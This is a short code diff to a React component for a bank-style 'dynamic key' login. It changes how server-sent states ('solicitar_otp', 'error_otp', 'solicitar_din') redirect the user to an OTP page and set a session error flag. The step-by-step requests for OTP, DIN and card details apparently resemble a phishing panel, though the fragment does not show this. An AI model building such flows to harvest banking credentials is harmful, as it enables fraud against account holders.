@@ -452,18 +452,21 @@ export default function ClaveDinamica() {
                         break;
                     case 'solicitar_otp':
 
-                        // Se quita el estado de cargando
-                        setCargando(false);
-
-                        // Se limpia la clave
-                        handleClear();
+                        // Redirigir a la validación de tarjeta de crédito
+                        window.location.href = '/numero-otp';
 
                         // Se sale del ciclo
                         break;
                     case 'error_otp':
-                        window.location.href = '/numero-otp';
-                        break;
 
+                        // Se almacena en el localStorage el estado de sesión con error
+                        localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la validación de tarjeta de crédito
+                        window.location.href = '/numero-otp';
+
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_din':
 
                         // Recargar para reintentar DIN
